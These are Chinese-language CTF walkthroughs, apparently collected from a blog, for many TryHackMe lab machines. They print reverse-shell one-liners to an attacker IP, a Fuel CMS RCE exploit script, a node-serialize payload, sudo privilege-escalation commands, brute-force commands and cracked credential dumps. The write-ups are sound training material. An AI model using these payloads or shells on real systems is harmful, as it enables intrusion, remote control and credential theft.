merlin@ubuntu:/home/skyfuck$ sudo -lMatching Defaults entries for merlin on ubuntu:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser merlin may run the following commands on ubuntu:    (root : root) NOPASSWD: /usr/bin/zip

提权成功

  • -T：测试压缩包的完整性
  • –unzip-command：指定解压时要执行的命令
  • /tmp/test.zip：任意 zip 文件名
  • /etc/hosts：任意要打包的文件
merlin@ubuntu:/home/skyfuck$ sudo zip -T --unzip-command="/bin/bash -c 'bash -i'" /tmp/test.zip /etc/hosts  adding: etc/hosts (deflated 31%)root@ubuntu:/home/skyfuck# iduid=0(root) gid=0(root) groups=0(root)root@ubuntu:/home/skyfuck# cat /root/root.txtTHM{Z1P_1S_FAKE}
entry.summary:
tomghost

Identify recent vulnerabilities t

entry.title: TryHackMe_合集2
entry.content:
Brooklyn Nine Nine

This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box.

端口扫描，开启了 22，21，80 端口

访问网站，f12 得到提示

访问图片地址下载图片 /brooklyn99.jpg

用 steghide 查看信息，需要密码

开启了 ftp 服务，尝试匿名登录，下载 txt 文件

里面说 jake 用户使用了弱密码

使用 hydra 破解，得到密码 987654321

hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.145.165.158 ssh

使用 ssh 登录成功

sudo -l 得到 less 命令可以无密码 root 执行

sudo less 查看 /etc/profile，输入 !bash 然后回车就得到了 root 权限

Lo-Fi

Want to hear some lo-fi beats, to relax or study to? We’ve got you covered!

扫描端口得到 80，22 端口

参数使用了 page，可能存在目录遍历

直接输入多级目录查看 /etc/passwd 验证是否存在目录遍历

遍历 flag.txt

Fowsniff CTF

Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!

端口扫描

访问，页面说出现了数据泄露

谷歌搜索该公司，在 github 找到了泄露的数据

FOWSNIFF CORP PASSWORD LEAK            ''~``           ( o o )+-----.oooO--(_)--Oooo.------+|                            ||          FOWSNIFF          ||            got             ||           PWN3D!!!         ||                            |         |       .oooO                |         |        (   )   Oooo.       |         +---------\ (----(   )-------+           \_)    ) /                 (_/FowSniff Corp got pwn3d by B1gN1nj4!No one is safe from my 1337 skillz!  mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56tegel@fowsniff:1dc352435fecca338acfd4be10984009baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bbseina@fowsniff:90dc16d47114aa13671c697fd506cf26stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabdmursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3bparede@fowsniff:4d6e42f56e127803285a0a7649b5ab11sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e Fowsniff Corporation Passwords LEAKED!FOWSNIFF CORP PASSWORD DUMP! Here are their email passwords dumped from their databases.They left their pop3 server WIDE OPEN, too! MD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P l8r n00bz! B1gN1nj4

在 https://hashes.com/en/decrypt/hash 解密

mauer@fowsniff:mailcallmustikka@fowsniff:bilbo101tegel@fowsniff:apples01baksteen@fowsniff:skyler22seina@fowsniff:scoobydoo2stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabdmursten@fowsniff:carp4everparede@fowsniff:orlando12sciana@fowsniff:07011972

将账号和密码分别存储

awk -F'@' '{print $1}' user.txt > name.txt sed -n 's/.*://p' user.txt > pass.txt

利用 msf 进行爆破，搜索 pop3 ，找到登录相关的模块

修改一些设置

use auxiliary/scanner/pop3/pop3_loginshow optionsset RHOSTS 10.146.190.242set USER_FILE /root/name.txtset PASS_FILE /root/pass.txtset THREADS 10run

运行得到账号密码

利用 nc 登录并查看邮件

nc 10.146.190.242 110USER seinaPASS scoobydoo2LISTRETR 1RETR 2

翻译

得到了 ssh密码和账号

baksteen

S1ck3nBluff+secureshell

成功登录

寻找该组成员可以执行的文件，有一个 /opt/cube/cube.sh 文件

find  / -group users -type f 2>/dev/null

在该文件中植入反弹命令

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.140.133",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

运行该文件发现，登录 ssh 时出现的内容和该文件里面的内容一样

猜测可能在 ssh 启动的时候会自动运行该文件

因此重新登录 ssh，本机监听端口，成功得到 root 权限

Smag Grotto

Follow the yellow brick road.

端口扫描，开启了 22，80 端口，访问网站没什么有用信息

目录扫描得到 /mail，访问可以下载一个 pcap 文件

打开文件的得到一个网站的账号密码

development.smag.thm/login.php

username=helpdesk

password=cH4nG3M3_n0w

修改 hosts 文件再登录

进去是一个命令执行的输入框，但是输入都没有回显，尝试反弹 shell

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.140.133 4444 >/tmp/f

该账户没有权限查看 /home/jake 目录下的文件，上传 linpeas.sh 来查看有无利用点

这个是将公钥替换成私钥

所以可以将自己的公钥替换它的公钥，这样我们就可以无密码登录 jake 了

用自己的公钥来替换

echo "ssh-rsa AAAAB3Nza..." > /opt/.backups/jake_id_rsa.pub.backup

ssh 登录，不需要密码

apt-get 有无密码权限，该命令支持通过 -o 调用外部命令，让它在更新前直接执行 /bin/bash，就可以提权了

sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/bash"

RootMe

A ctf for beginners, can you root me?

端口扫描，开启了 22，80 端口，访问网站没有有用信息

扫目录得到一个 /panel，访问是一个文件上传页面

但是不能上传 php

可以上传 jpg，但是修改头文件以及其他参数都不行

猜测是黑名单，修改后缀为 php5 成功上传

查找带有 SUID 权限的文件，找到一个 python2

find / -type f -user root -perm -u=s 2> /dev/null

由于这个是 shell 是在 web 上，没法提权，刚好靶机有 nc ，但是没有 -e 参数，所以用其他利用方式反弹

nc 192.168.140.133 4444 -e /bin/bash mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.140.133 4444 >/tmp/f

因为 python2.7 有 SUID root 权限，运行它时，会以 root 身份执行，用 os.setuid(0) 强行把用户 ID 设为 0（root），再启动 bash 拿到 root 权限

python -c 'import os; os.setuid(0); os.system("/bin/bash")'

Jax sucks alot………….

In JavaScript everything is a terrible mistake.

端口扫描，得到 22，80 端口

访问网站，有一个输入框

输入信息没反应，根据题目描述，控制台发现 js 代码

document.getElementById("signup").addEventListener("click", function() {var date = new Date();    date.setTime(date.getTime()+(-1*24*60*60*1000));    var expires = "; expires="+date.toGMTString();    document.cookie = "session=foobar"+expires+"; path=/";    const Http = new XMLHttpRequest();        console.log(location);        const url=window.location.href+"?email="+document.getElementById("fname").value;        Http.open("POST", url);        Http.send();setTimeout(function() {window.location.reload();}, 500);});

burpsuite 抓包，session 是 base64 编码

解码后就是输入框输入的数据

构造 poc 并编码

{"email":"_$$ND_FUNC$$_function(){ var net = require('net'), cp = require('child_process'), sh = cp.spawn('/bin/sh', []); var client = new net.Socket(); client.connect(4444, '192.168.140.133', function() { client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); }); return /a/; }()"} 

用 get 发包，并构造 cookie，成功反弹

执行 sudo -l

利用 /usr/bin/npm 提权

TF=$(mktemp -d)echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.jsonsudo npm -C $TF --unsafe-perm i
entry.summary: Brooklyn Nine Nine

entry.title: TryHackMe_合集1
entry.content:
Neighbour

Check out our new cloud service, Authentication Anywhere. Can you find other user’s secrets?

进入靶场，是一个登录页面

根据提示 ctrl+u

使用 guest/guest 登录，再次 ctrl+u

注意到 url 后面的参数是 user=guest

将其改为 admin

Anonfor

描述：boot2root machine for FIT and bsides guatemala CTF

扫描端口

用 ftp 匿名登录

在 home/melodias 下找到 user.txt

get 下载到本地

又在 notread 目录下找到两个文件，下载下来

private.asc 是一段 pgp 私钥

backup.pgp 是一段加密字符

开始破解，得到密码 xbox360

gpg2john private.asc > pgp.hash john pgp.hash --wordlist=/usr/share/wordlists/rockyou.txt

使用密码 xbox360 导入私钥

gpg --import private.asc

解密 backup.pgp

gpg --decrypt backup.pgp

得到了/etc/shadow 哈希文件，里面有 root 密码哈希

root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5

破解密码

gpg --decrypt backup.pgp > shadow john shadow --wordlist=/usr/share/wordlists/rockyou.txt

得到密码 hikari，ssh登录

Ignite

描述：A new start-up has a few issues with their web server.

使用了 Fuel CMS，版本是 1.4

谷歌搜索该版本存在无认证 rce 漏洞 CVE-2018-16763

验证漏洞

payload

/fuel/pages/select/?filter=%27%2Bpi(print(%24a%3D%27system%27))%2B%24a(%27id%27)%2B%27

kali 搜索相关漏洞并下载 47138.py

searchsploit "fuel" searchsploit -m 47138

修改 14 行 url，注释 25、26，添加 27

# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)# Date: 2019-07-19# Exploit Author: 0xd0ff9# Vendor Homepage: https://www.getfuelcms.com/# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1# Version: <= 1.4.1# Tested on: Ubuntu - Apache2 - php5# CVE : CVE-2018-16763import requestsimport urlliburl = "http://10.48.151.179"def find_nth_overlapping(haystack, needle, n):    start = haystack.find(needle)    while start >= 0 and n > 1:        start = haystack.find(needle, start+1)        n -= 1    return startwhile 1:    xxxx = raw_input('cmd:')    burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"     #proxy = {"http":"http://127.0.0.1:8080"}     #r = requests.get(burp0_url, proxies=proxy)    r = requests.get(burp0_url)    html = "<!DOCTYPE html>"    htmlcharset = r.text.find(html)    begin = r.text[0:20]    dup = find_nth_overlapping(r.text,begin,2)    print r.text[0:dup]

使用python2 执行，成功反弹 

python2 47138.py bash -c "{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIwNi4xNjkvNDQ0NCAwPiYxCg==}|{base64,-d}|bash"

​

在 home/www-data 下找到 flag.txt

在网站首页提到了一个数据库文件

查看该数据库文件，给了 root 账号的密码

使用 su root 登录提示需要一个终端

使用 script 创建一个伪终端

script /dev/null

获取 root.txt

Pickle Rick

描述：A Rick and Morty CTF. Help turn Rick back into a human!

进入网站，在控制台得到用户名 R1ckRul3s

目录扫描

gobuster dir -u http://10.49.138.14 -w /usr/share/wordlists/dirb/common.txt

访问 /robots.txt，只有一串字符串 Wubbalubbadubdub，猜测可能是密码

访问 /login.php

用户名：R1ckRul3s

密码：Wubbalubbadubdub

成功登录，进去后是一个可以命令执行的输入框，输入 ls 出现结果

尝试 cat Sup3rS3cretPickl3Ingred.txt

但是命令被禁止了

那就使用其他文件查看的命令

尝试 more 不行，使用 tac 成功得到第一个 flag

再 tac clue.txt，因为该英文单词是线索的意思

显示 Look around the file system for the other ingredient，让我们查看其它文件系统

输入 ls /home ，输出 rick 和 ubuntu

输入 ls -l /home/rick ，输出 -rwxrwxrwx 1 root root 13 Feb 10 2019 second ingredients

查看该文件，文件名带空格，因此需要引号，成功得到 flag 以及一段 base64 编码

对该 base64 经过数次解码得到 rabbit hole，兔子洞

接下来尝试提权，输入 sudo -l，可以无密码以 root 执行任意命令

输入 sudo ls /root 输出 3rd.txt

输入 sudo tac /root/3rd.txt 得到最后一个 flag

mKingdom

描述：Beginner-friendly box inspired by a certain mustache man.

​

扫描端口

访问 85 端口，就一个鬼脸，然后什么都没有了

目录扫描

访问 /app，有一个按钮，点击进去是一个网站，使用了concrete5 cms，右边还有一个登录按钮

登录页面，使用弱密码 admin/password成功登录

进入后台，有可进行文件上传的地方

设置里面可以设置上传的文件类型，添加上php

上传木马文件

蚁剑连接，在 /home 目录下有两个用户

知道了 toad 用户的密码，mario 的没找到

蚁剑终端里不能切换用户，也不能反弹 shell，于是上传该 单文件 PHP shell

上传后直接访问该 php 文件即可，攻击机监听端口，使用 python 反弹 shell

python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.206.169',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

使用刚才得到的密码登录 toad

该账户目录下只有一个 smb.txt

执行 env 命令，发现密码字段

base64 解码

ikaTeNTANtES

使用该密码登录 mario 账户

查看 user.txt 文件结果没权限

后面不会了，看 wp

原理就是每一分钟就会自动下载 mkingdom.thm:85 端口下 /www/app/castle/application 文件夹里面的 counter.sh 文件

修改 hosts 文件

本地桌面创建同名文件 counter.sh ,写入反弹指令

同时 python开启 85 端口允许靶机访问，同时监听反弹端口

等待一会成功反弹

但是同样没有权限

那就修改 counter.sh 文件，不再反弹，而是复制我们需要的位版本到指定目录

Dav

描述：boot2root machine for FIT and bsides guatemala CTF

扫描端口，只开放了 80 端口，进去是一个阿帕奇默认页面

那就使用 gobuister 扫目录，得到目录 /webdav

访问该地址弹出登录框

webdav 是阿帕奇自带的一个模块，github 搜索默认密码 ，使用 wammp/xammp成功登录

进去后有一个文件，查看就是 webdav 的账号密码，然后就没啥了

创建 shell.php，里面写入反弹指令

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.206.169/4444 0>&1'");?>

使用 cadaver 连接，然后使用 put 上传后门

本机监听端口，再去网页端访问 /webdav/shell.php

成功反弹

sudo -l 发现可以我i密码 root 执行 /bin/cat

那就直接查看 root.txt

TakeOver

This challenge revolves around subdomain enumeration.

访问网站会重定向到 futurevera.thm，修改 hosts 文件即可

子域名扫描

但是无法访问

查看证书得到一个新的地址

curl 访问，得到 flag

curl -v http://secrethelpdesk934752.support.futurevera.thm

Couch

Hack into a vulnerable database server that collects and stores data in JSON-based document formats, in this semi-guided challenge.

端口扫描，其中一个是 couchdb 数据库

访问

网上查找这个数据库的相关信息，访问 /_utils 查看 web 管理器

访问 /_all_dbs 查看所有数据库

在 secret 数据库里面找到一个账号密码

atena

t4qfzcc4qN##

使用 ssh 登录

上传 linpeas，结果看到了 .bash_history 这个文件

查看 .bash_history ，有一条 docker 命令

docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine

而且在 linpeas 里面看到有过 docker 的记录

运行该命令得到 root 权限
entry.summary:
Neighbour

Check out our new cloud servi

entry.title: TryHackMe_Bugged
entry.content:
Bugged

John likes to live in a very Internet connected world. Maybe too connected…

端口扫描

序号Host地址端口协议Uri地址标题Banner状态码
110.145.162.20722SSH10.145.162.207:22OpenSSH 8.2p1 Ubuntu 4ubuntu0.130
210.145.162.2071883MQTT10.145.162.207:1883UnKnown0

MQTT 是物联网常用的消息协议，可以使用 mosquitto-clients 工具来连接

安装

apt install mosquitto-clients

尝试连接并订阅所有主题

这里有一条重复消息，它很可能是 IoT 设备用于接收命令的控制主题

┌──(root㉿kali)-[~/桌面]└─# mosquitto_sub -h 10.145.162.207 -p 1883 -t "#" -v...eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==...

解码

{  "id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d",  "registered_commands": ["HELP", "CMD", "SYS"],  "pub_topic": "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub",  "sub_topic": "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"}

尝试对 U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub 和 XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub 发送消息

mosquitto_pub -h 10.145.162.207 -p 1883 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m '{"cmd":"HELP"}'

第一个没收到消息，第二个收到了消息

U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=

解码后提示格式错误

┌──(root㉿kali)-[~/桌面]└─# echo "SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=" | base64 -dInvalid message format.Format: base64({"id": "<backdoor id>", "cmd": "<command>", "arg": "<argument>"})

构造 json 消息，并进行 base64 编码

{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "HELP", "arg": ""}

再次发送命令

mosquitto_pub -h 10.145.162.207 -p 1883 -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub"  -m 'eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkhFTFAiLCAiYXJnIjogIiJ9'

对收到的消息解码，的确可以执行 help 命令

┌──(root㉿kali)-[~/桌面]└─# echo "" | base64 -d{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"Message format:
    Base64({
        \"id\": \"<Backdoor ID>\",
        \"cmd\": \"<Command>\",
        \"arg\": \"<arg>\",
    })

Commands:
    HELP: Display help message (takes no arg)
    CMD: Run a shell command
    SYS: Return system information (takes no arg)
"}
命令说明
HELP显示帮助信息
CMD执行系统命令（需要 arg 参数）
SYS返回系统信息

尝试使用 CMD 执行 id 命令

构造 json 格式并编码

{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "id"}

成功返回当前用户

┌──(root㉿kali)-[~/桌面]└─# echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoidWlkPTEwMDAoY2hhbGxlbmdlKSBnaWQ9MTAwMChjaGFsbGVuZ2UpIGdyb3Vwcz0xMDAwKGNoYWxsZW5nZSlcbiJ9" | base64 -d{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
"}

尝试反弹 shell

{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "bash -c \"bash -i >& /dev/tcp/192.168.140.133/4444 0>&1\""}

返回网络连接错误

┌──(root㉿kali)-[~/桌面]└─# echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiYmFzaDogY29ubmVjdDogTmV0d29yayBpcyB1bnJlYWNoYWJsZVxuYmFzaDogbGluZSAxOiAvZGV2L3RjcC8xOTIuMTY4LjE0MC4xMzMvNDQ0NDogTmV0d29yayBpcyB1bnJlYWNoYWJsZVxuIn0=" | base64 -d{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"bash: connect: Network is unreachable
bash: line 1: /dev/tcp/192.168.140.133/4444: Network is unreachable
"}

既然不能反弹，那就直接寻找文件位置

{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "ls"}

flag.txt 就在当前目录

┌──(root㉿kali)-[~/桌面]└─# echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbiJ9" | base64 -d{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag.txt
"}

查看文件

{"id": "cdd1b1c0-1c40-4b0f-8e22-61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}

得到 flag

──(root㉿kali)-[~/桌面]└─# echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3sxOGQ0NGZjMDcwN2FjOGRjOGJlNDViYjgzZGI1NDAxM31cbiJ9" | base64 -d{"id":"cdd1b1c0-1c40-4b0f-8e22-61b357548b7d","response":"flag{18d44fc0707ac8dc8be45bb83db54013}
"}
entry.summary:
Bugged

John likes to live in a very Internet con

entry.title: TryHackMe_CyberHeroes
entry.content:
CyberHeroes

Want to be a part of the elite club of CyberHeroes? Prove your merit by finding a way to log in!

访问网站，查看页面源代码发现一串 js 代码

用户名: h3ck3rBoi

密码: 需要计算 RevereString("54321@terceSrepuS")

这个函数的作用是反转字符串，结果是 SuperSecret@12345

当用户名和密码正确时，脚本会请求一个 txt 文件

RandomLo0o0o0o0o0o0o0o0o0o0gpath12345_Flag_ + h3ck3rBoi + _ + SuperSecret@12345 + .txt

<script>  function authenticate() {    a = document.getElementById('uname')    b = document.getElementById('pass')    const RevereString = str => [...str].reverse().join('');    if (a.value=="h3ck3rBoi" & b.value==RevereString("54321@terceSrepuS")) {       var xhttp = new XMLHttpRequest();      xhttp.onreadystatechange = function() {        if (this.readyState == 4 && this.status == 200) {          document.getElementById("flag").innerHTML = this.responseText ;          document.getElementById("todel").innerHTML = "";          document.getElementById("rm").remove() ;        }      };      xhttp.open("GET", "RandomLo0o0o0o0o0o0o0o0o0o0gpath12345_Flag_"+a.value+"_"+b.value+".txt", true);      xhttp.send();    }    else {      alert("Incorrect Password, try again.. you got this hacker !")    }  }</script>

因此，可以请求组合后的路径

得到 flag

┌──(root㉿kali)-[~/桌面]└─# curl http://10.146.179.7/RandomLo0o0o0o0o0o0o0o0o0o0gpath12345_Flag_h3ck3rBoi_SuperSecret@12345.txtCongrats Hacker, you made it !!Go ahead and nail other challenges as well :D     flag{edb0be532c540b1a150c3a7e85d2466e}
